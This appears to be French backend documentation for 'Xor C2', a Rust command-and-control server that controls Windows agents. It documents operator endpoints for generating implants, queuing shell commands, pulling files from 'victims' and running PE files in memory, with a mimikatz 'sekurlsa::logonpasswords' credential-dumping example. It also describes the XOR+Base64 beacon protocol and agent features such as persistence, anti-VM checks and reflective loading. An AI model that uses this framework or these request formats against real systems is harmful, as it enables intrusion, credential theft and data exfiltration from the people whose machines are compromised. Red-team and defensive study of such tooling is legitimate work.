# Xor C2 - Documentation Backend

## Vue d'ensemble

Le backend Xor C2 est un serveur de commande et contrôle (C2) écrit en Rust. Il se compose de deux services principaux :

- **Admin API** (Actix-web) : Port 8088 - Interface REST pour les opérateurs
- **Listener HTTP** (Axum) : Port configurable (défaut 80) - Communication avec les agents

## Architecture Globale

```mermaid
flowchart TB
    subgraph Operator["Opérateur"]
        GUI[Client GUI<br/>Rust + egui]
        CLI[API REST<br/>curl/Postman]
    end

    subgraph Backend["Teamserver - Rust"]
        subgraph AdminAPI["Admin API :8088"]
            Auth[Authentification<br/>JWT + bcrypt]
            subgraph Handlers["Handlers modulaires"]
                H1[auth.rs]
                H2[agents.rs]
                H3[tasks.rs]
                H4[files.rs]
                H5[listeners.rs]
                H6[victims.rs]
            end
        end
        
        subgraph Listeners["Listeners"]
            HTTP[HTTP Listener<br/>Axum :80]
            HTTPS[HTTPS Listener<br/>Axum :443]
        end
        
        DB[(SQLite<br/>xor_c2.db)]
        Crypto[Chiffrement<br/>XOR + Base64]
    end

    subgraph Targets["Cibles"]
        Agent1[Agent Windows<br/>EXE/DLL]
        Agent2[Agent Windows<br/>Shellcode/Service]
    end

    GUI --> Auth
    CLI --> Auth
    Auth --> Handlers
    Handlers --> DB
    HTTP --> DB
    HTTPS --> DB
    HTTP --> Crypto
    HTTPS --> Crypto
    Agent1 --> HTTP
    Agent1 --> HTTPS
    Agent2 --> HTTP
    Agent2 --> HTTPS
```

## Flux de Communication

```mermaid
sequenceDiagram
    participant Op as Opérateur
    participant API as Admin API<br/>:8088
    participant DB as SQLite
    participant Listener as HTTP Listener<br/>:80
    participant Agent as Agent

    Note over Op,Agent: 1. Authentification
    Op->>API: POST /api/login
    API->>DB: Vérifier credentials
    DB-->>API: User valide
    API-->>Op: JWT Token

    Note over Op,Agent: 2. Envoi de commande
    Op->>API: POST /api/task<br/>{agent_id, command}
    API->>DB: INSERT commands<br/>status='pending'
    API-->>Op: command_id

    Note over Op,Agent: 3. Agent beacon
    Agent->>Listener: POST /api/update<br/>(XOR + Base64)
    Listener->>DB: SELECT commands<br/>WHERE status='pending'
    DB-->>Listener: Commandes en attente
    Listener->>DB: UPDATE status='sent'
    Listener-->>Agent: Commandes (XOR + Base64)

    Note over Op,Agent: 4. Exécution et résultat
    Agent->>Agent: Exécute commande
    Agent->>Listener: POST /api/result<br/>(XOR + Base64)
    Listener->>DB: INSERT results
    Listener->>DB: UPDATE status='completed'
    Listener-->>Agent: OK

    Note over Op,Agent: 5. Récupération résultats
    Op->>API: GET /api/results/{agent_id}
    API->>DB: SELECT results
    DB-->>API: Résultats
    API-->>Op: JSON results
```

## Stack Technique

| Composant | Technologie |
|-----------|-------------|
| Langage | Rust |
| Admin API | Actix-web |
| Listener HTTP/HTTPS | Axum + axum-server |
| TLS/SSL | Rustls |
| Certificats | rcgen (auto-génération) |
| Base de données | SQLite |
| Authentification | JWT (jsonwebtoken) |
| Hash mots de passe | bcrypt |
| Chiffrement C2 | XOR + Base64 |

## Endpoints API Admin

### Authentification

#### POST /health
Vérification de l'état du serveur.

**Authentification** : Aucune

**Réponse** :
```json
{
  "status": "healthy",
  "service": "Xor C2",
  "version": "1.0.0"
}
```

---

#### POST /api/login
Authentification et génération de token JWT.

**Authentification** : Aucune

**Requête** :
```json
{
  "username": "admin",
  "password": "admin123"
}
```

**Réponse succès** (200) :
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "message": "Login successful"
}
```

**Réponse erreur** (401) :
```json
{
  "success": false,
  "token": null,
  "message": "Invalid credentials"
}
```

---

#### POST /api/logout
Invalidation du token JWT.

**Authentification** : Bearer Token

**Réponse** :
```json
{
  "success": true,
  "message": "Logged out successfully"
}
```

---

### Gestion des Agents

#### GET /api/agents
Liste tous les agents enregistrés (uniquement ceux qui ont fait au moins un check-in).

**Authentification** : Bearer Token

**Réponse** :
```json
[
  {
    "agent_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
    "hostname": "DESKTOP-ABC123",
    "username": "DOMAIN\\admin",
    "ip": "192.168.1.100",
    "process_name": "explorer.exe",
    "last_seen": "2025-01-25T10:30:00Z",
    "payload_type": "exe",
    "listener_name": "http"
  }
]
```

**Note** : Les agents apparaissent dans cette liste uniquement après leur premier check-in (beacon).

---

#### POST /api/generate
Génère un nouvel agent compilé.

**Authentification** : Bearer Token

**Requête** :
```json
{
  "listener_name": "http",
  "payload_type": "exe",
  "config": {
    "host": "192.168.1.10",
    "port": 80,
    "uri_path": "/api/update",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "xor_key": "mysupersecretkey",
    "beacon_interval": 60,
    "anti_vm": false,
    "headers": [["Accept", "application/json"]]
  }
}
```

**Réponse** : Fichier binaire (application/octet-stream)

```mermaid
flowchart LR
    A[Requête génération] --> B[Validation listener]
    B --> C[Génération config.h]
    C --> D[Compilation C++<br/>mingw32-g++]
    D --> E[Retour binaire]
```

**Note** : L'agent n'est pas enregistré dans la base de données à la génération. Il sera automatiquement enregistré lors de son premier check-in (beacon).

---

### Exécution de Commandes

#### POST /api/task
Envoie une commande à un agent.

**Authentification** : Bearer Token

**Types de commandes** :

| Type | Format | Description |
|------|--------|-------------|
| Shell | `whoami` | Commande système |
| Download | `/download C:\file.txt` | Télécharge un fichier depuis la cible |
| Upload | `/upload /local/file.exe` | Envoie un fichier vers la cible |
| PE-Exec | `/pe-exec mimikatz.exe -args` | Exécute un PE en mémoire |

**Requête Shell** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "whoami /all"
}
```

**Requête Download** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "/download C:\\Users\\admin\\Documents\\secret.pdf"
}
```

**Requête Upload** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "/upload /home/operator/payload.exe"
}
```

**Requête PE-Exec** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "command": "/pe-exec /tools/mimikatz.exe sekurlsa::logonpasswords"
}
```

**Réponse** :
```json
{
  "success": true,
  "command_id": 42,
  "message": "Command queued"
}
```

---

#### GET /api/results/{agent_id}
Récupère les résultats d'exécution d'un agent.

**Authentification** : Bearer Token

**Réponse** :
```json
[
  {
    "id": 1,
    "command_id": 42,
    "output": "DOMAIN\\admin",
    "success": true,
    "types": "text",
    "filename": null,
    "received_at": "2025-01-25T10:35:00Z"
  },
  {
    "id": 2,
    "command_id": 43,
    "output": "eyJmaWxlbmFtZSI6InNlY3JldC5wZGYi...",
    "success": true,
    "types": "file",
    "filename": "secret.pdf",
    "received_at": "2025-01-25T10:36:00Z"
  }
]
```

---

### Opérations Fichiers

#### POST /api/upload
Met en file d'attente un fichier à envoyer vers un agent.

**Authentification** : Bearer Token

**Requête** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "filename": "payload.exe",
  "content": "TVqQAAMAAAAEAAAA//8AALgAAAA..."
}
```

**Réponse** :
```json
{
  "success": true,
  "message": "Upload queued",
  "command_id": 44,
  "filename": "payload.exe",
  "size": 73728
}
```

---

#### GET /api/download/{result_id}
Télécharge un fichier récupéré depuis un agent.

**Authentification** : Bearer Token

**Réponse** : Fichier binaire avec headers :
- `Content-Type: application/octet-stream`
- `Content-Disposition: attachment; filename="secret.pdf"`

---

#### GET /api/view/{result_id}
Affiche le contenu d'un fichier texte.

**Authentification** : Bearer Token

**Réponse (texte)** :
```json
{
  "result_id": 2,
  "filename": "config.txt",
  "size": 1024,
  "type": "text",
  "content": "contenu du fichier..."
}
```

**Réponse (binaire)** :
```json
{
  "result_id": 3,
  "filename": "image.png",
  "size": 52428,
  "type": "binary",
  "message": "Binary file - use /api/download"
}
```

---

### Gestion des Victimes

#### GET /api/victims
Liste toutes les machines compromises.

**Authentification** : Bearer Token

**Réponse** :
```json
[
  {
    "agent_id": "a1b2c3d4-...",
    "hostname": "DESKTOP-ABC123",
    "username": "DOMAIN\\admin",
    "os": "Windows 10",
    "ip_address": "192.168.1.100",
    "process_name": "explorer.exe",
    "first_seen": "2025-01-25T09:00:00Z",
    "last_seen": "2025-01-25T10:30:00Z"
  }
]
```

---

#### GET /api/victim/details/{agent_id}
Détails d'une victime spécifique.

**Authentification** : Bearer Token

---

### Gestion des Listeners

#### POST /api/add/listener
Crée un nouveau listener HTTP ou HTTPS.

**Authentification** : Bearer Token

**Requête HTTP** :
```json
{
  "listener_name": "http_listener",
  "listener_type": "http",
  "listener_ip": "0.0.0.0",
  "listener_port": 8080,
  "xor_key": "encryption_key_here",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "uri_paths": "/api/beacon",
  "headers": [["Accept", "application/json"]],
  "tls_cert": "",
  "tls_key": "",
  "tls_cert_chain": ""
}
```

**Requête HTTPS (avec auto-génération certificat)** :
```json
{
  "listener_name": "https_listener",
  "listener_type": "https",
  "listener_ip": "0.0.0.0",
  "listener_port": 443,
  "xor_key": "encryption_key_here",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "uri_paths": "/api/beacon",
  "headers": [["Accept", "application/json"]],
  "tls_cert": "",
  "tls_key": "",
  "tls_cert_chain": ""
}
```

**Requête HTTPS (avec certificat custom)** :
```json
{
  "listener_name": "https_custom",
  "listener_type": "https",
  "listener_ip": "0.0.0.0",
  "listener_port": 443,
  "xor_key": "encryption_key_here",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "uri_paths": "/api/beacon",
  "headers": [["Accept", "application/json"]],
  "tls_cert": "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----",
  "tls_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----",
  "tls_cert_chain": "-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----"
}
```

**Réponse HTTP** :
```json
{
  "success": true,
  "message": "HTTP Listener 'http_listener' added successfully. Restart server to activate."
}
```

**Réponse HTTPS (auto-génération)** :
```json
{
  "success": true,
  "message": "HTTPS Listener 'https_listener' added successfully (self-signed certificate auto-generated). Restart server to activate.",
  "cert_auto_generated": true
}
```

**Note** : Pour les listeners HTTPS, si `tls_cert` et `tls_key` sont vides, un certificat self-signed est automatiquement généré avec les SANs suivants :
- `{listener_name}.xor-c2.local` (CN)
- `localhost`
- `127.0.0.1`
- L'IP du listener (si différente de 0.0.0.0/127.0.0.1)

---

## Endpoints Listener (Agent ↔ Serveur)

Ces endpoints sont utilisés par les agents pour communiquer avec le serveur.

### POST /api/update (ou URI configuré)
Beacon de check-in de l'agent.

**Chiffrement** : XOR + Base64

**Requête (déchiffrée)** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "hostname": "DESKTOP-ABC123",
  "username": "DOMAIN\\admin",
  "process_name": "explorer.exe",
  "ip_address": "192.168.1.100",
  "results": ""
}
```

**Validation** :
- Header `User-Agent` doit correspondre exactement à la configuration du listener

---

### POST /api/command
Récupération des commandes en attente.

**Chiffrement** : XOR + Base64

**Requête (déchiffrée)** :
```json
{
  "agent_id": "a1b2c3d4-..."
}
```

**Réponse (déchiffrée)** :
```json
{
  "success": true,
  "commands": [
    {"id": 42, "command": "'cmd':'whoami'"},
    {"id": 43, "command": "'download':'C:\\file.txt'"}
  ]
}
```

---

### POST /api/result
Soumission des résultats d'exécution.

**Chiffrement** : XOR + Base64

**Requête texte (déchiffrée)** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "command_id": 42,
  "output": "DOMAIN\\admin",
  "success": true,
  "types": "text"
}
```

**Requête fichier (déchiffrée)** :
```json
{
  "agent_id": "a1b2c3d4-...",
  "command_id": 43,
  "output": "eyJmaWxlbmFtZSI6ImZpbGUudHh0IiwiY29udGVudCI6Ii4uLiJ9",
  "success": true,
  "types": "file"
}
```

---

### GET /api/pe-data/{command_id}
Récupération des données PE pour exécution en mémoire.

**Chiffrement** : XOR + Base64

**Réponse (déchiffrée)** :
```json
{
  "content": "TVqQAAMAAAAEAAAA...",
  "args": "c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz"
}
```

---

## Schéma Base de Données

```mermaid
erDiagram
    users ||--o{ sessions : has
    users ||--o{ agents : creates
    users ||--o{ agents_log : performs
    
    agents ||--o{ commands : receives
    agents ||--o{ results : produces
    agents ||--|| victim_info : describes
    
    commands ||--o{ results : generates
    commands ||--o| pe_exec_data : has
    
    listeners ||--o{ agents : configures

    users {
        int id PK
        string username UK
        string password_hash
        datetime created_at
        datetime last_login
    }

    sessions {
        int id PK
        string token UK
        string username FK
        datetime created_at
        datetime expires_at
        string ip_address
    }

    agents {
        int id PK
        string agent_id UK
        string type
        string users FK
        string file_path
        datetime created_at
    }

    agents_log {
        int id PK
        string agent_id
        string action
        string details
        string username FK
        datetime timestamp
    }

    listeners {
        int id PK
        string name UK
        string listener_type
        string host
        int port
        string xor_key
        string user_agent
        string uri_paths
        text http_headers
        text tls_cert
        text tls_key
        text tls_cert_chain
        datetime created_at
    }

    victim_info {
        string agent_id PK
        string hostname
        string username
        string os
        string ip_address
        string process_name
        datetime first_seen
        datetime last_seen
    }

    commands {
        int id PK
        string agent_id
        text command
        string status
        datetime created_at
        datetime sent_at
        datetime completed_at
    }

    results {
        int id PK
        string agent_id
        int command_id FK
        text output
        bool success
        string types
        string filename
        datetime received_at
    }

    pe_exec_data {
        int command_id FK
        text pe_data
        datetime created_at
    }
```

## Chiffrement

### Algorithme XOR

```mermaid
flowchart LR
    subgraph Chiffrement
        A[Données JSON] --> B[XOR avec clé]
        B --> C[Base64 encode]
        C --> D[HTTP Body]
    end
    
    subgraph Déchiffrement
        E[HTTP Body] --> F[Base64 decode]
        F --> G[XOR avec clé]
        G --> H[Données JSON]
    end
```

**Implémentation** :
```rust
fn xor_transform(data: &[u8], key: &str) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key.bytes().nth(i % key.len()).unwrap())
        .collect()
}
```

**Note** : XOR est symétrique - la même opération chiffre et déchiffre.

---

## Configuration

### Fichier config/config.json

```json
{
  "server_port": 8088,
  "bind_address": "0.0.0.0",
  "agent_timeout": 300
}
```

### Variables d'environnement

| Variable | Description | Défaut |
|----------|-------------|--------|
| `JWT_SECRET` | Clé de signature JWT | `default-insecure-secret-change-me` |
| `JWT_EXP_HOURS` | Durée de vie token (heures) | `1` |

---

## Structure des Dossiers

```
C2-XOR/
├── docs/
│   ├── AGENT.md                     # Documentation agent
│   └── BACKEND.md                   # Documentation backend (ce fichier)
│
├── xor-c2-server/                   # Backend (Teamserver)
│   ├── config/
│   │   └── config.json              # Configuration serveur
│   ├── src/
│   │   ├── main.rs                  # Point d'entrée
│   │   ├── config.rs                # Chargement configuration
│   │   ├── admin/
│   │   │   ├── mod.rs               # Module admin
│   │   │   ├── routes.rs            # AppState + démarrage serveur
│   │   │   ├── auth.rs              # Gestion JWT (JwtManager)
│   │   │   ├── db.rs                # Opérations SQLite
│   │   │   ├── models.rs            # DTOs requête/réponse
│   │   │   ├── command_formatter.rs # Formatage commandes
│   │   │   ├── cert_generator.rs    # Génération certificats TLS
│   │   │   ├── error.rs             # Types d'erreurs serveur
│   │   │   └── handlers/            # Handlers API REST (modulaires)
│   │   │       ├── mod.rs           # Exports des handlers
│   │   │       ├── auth.rs          # health_check, login, logout
│   │   │       ├── agents.rs        # list_agents, generate_agent, agent_checkin
│   │   │       ├── tasks.rs         # send_task, get_results
│   │   │       ├── files.rs         # upload, download, view
│   │   │       ├── listeners.rs     # add_listener (HTTP/HTTPS)
│   │   │       └── victims.rs       # list_victims, get_victim_details
│   │   ├── agents/
│   │   │   ├── mod.rs               # Module agents
│   │   │   └── agent_handler.rs     # Cycle de vie agents + compilation
│   │   ├── listener/
│   │   │   ├── mod.rs               # Module listener
│   │   │   ├── http_listener.rs     # Listener HTTP/HTTPS (Axum)
│   │   │   └── profile.rs           # Configuration listener
│   │   ├── helper/
│   │   │   ├── mod.rs               # Module helper
│   │   │   └── helper_listener.rs   # Helpers réponses HTTP
│   │   └── encryption/
│   │       ├── mod.rs               # Module encryption
│   │       └── xor_cipher.rs        # Implémentation XOR
│   ├── downloads/                   # Fichiers téléchargés depuis agents
│   │   └── decrypt.py               # Script déchiffrement fichiers
│   ├── agents_results/              # Agents générés (exe, dll)
│   ├── temp_uploads/                # Fichiers temporaires pour upload
│   ├── Cargo.toml                   # Dépendances Rust
│   └── xor_c2.db                    # Base SQLite
│
├── xor-c2-client/                   # Client GUI (Opérateur)
│   ├── src/
│   │   ├── main.rs                  # Point d'entrée
│   │   ├── api.rs                   # Appels API REST
│   │   ├── models.rs                # Structures de données
│   │   ├── state.rs                 # État de l'application
│   │   ├── ui.rs                    # Module UI
│   │   └── ui/
│   │       ├── login.rs             # Interface de connexion
│   │       └── main_interface.rs    # Interface principale
│   ├── download/
│   │   └── decrypt.py               # Script déchiffrement fichiers
│   └── Cargo.toml                   # Dépendances Rust
│
└── agent/                           # Agent Windows (C++)
    └── http/
        ├── main_exe.cpp             # Point d'entrée EXE
        ├── main_dll.cpp             # Point d'entrée DLL
        ├── main_svc.cpp             # Point d'entrée Service Windows
        ├── config.h                 # Configuration (généré)
        ├── http_client.cpp/h        # Communication HTTP/HTTPS
        ├── crypt.cpp/h              # Chiffrement XOR
        ├── base64.cpp/h             # Encodage Base64
        ├── task.cpp/h               # Gestionnaire de tâches
        ├── pe-exec.cpp/h            # Exécution PE en mémoire
        ├── persistence.cpp/h        # Persistance (T1547.001)
        ├── file_utils.cpp/h         # Opérations fichiers
        ├── system_utils.cpp/h       # Infos système
        ├── vm_detection.cpp         # Détection VM (7 méthodes)
        └── ReflectiveLoader/
            ├── shellcodize.py       # Convertisseur DLL → Shellcode
            └── DllLoaderShellcode/
                └── Loader/
                    ├── ReflectiveLoader.cpp
                    └── ReflectiveLoader.h
```

---

## Sécurité

### Points forts
- Authentification JWT avec expiration
- Validation de session en base de données
- Hash bcrypt pour les mots de passe
- Validation User-Agent sur les listeners
- Vérification signature PE (header MZ)
- Support HTTPS natif avec Rustls
- Auto-génération de certificats self-signed

### Points d'attention
- XOR seul est cryptographiquement faible (à renforcer pour production)
- Credentials par défaut (`admin/admin123`) à changer impérativement
- SQLite limite la concurrence (considérer PostgreSQL pour scale)
- Les certificats self-signed générés automatiquement ne sont pas fiables pour la production
